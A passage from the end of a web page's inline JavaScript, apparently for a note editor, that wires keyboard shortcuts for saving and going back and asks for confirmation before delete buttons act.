                var btn = document.querySelector('.zen-editor .foot .btn-primary');
                if (btn) btn.click();
            }
            if (e.key === 'Escape') {
                var back = document.querySelector('.zen-editor .head .btn');
                if (back) window.location.href = back.href;
            }
        });
        
        // Confirm deletes
        document.querySelectorAll('.card-btn-danger').forEach(function(btn) {
            btn.addEventListener('click', function(e) {
                if (!confirm('⚠️ Permanent delete?')) e.preventDefault();
            });
        });
    })();
</script>
</body>
</html>
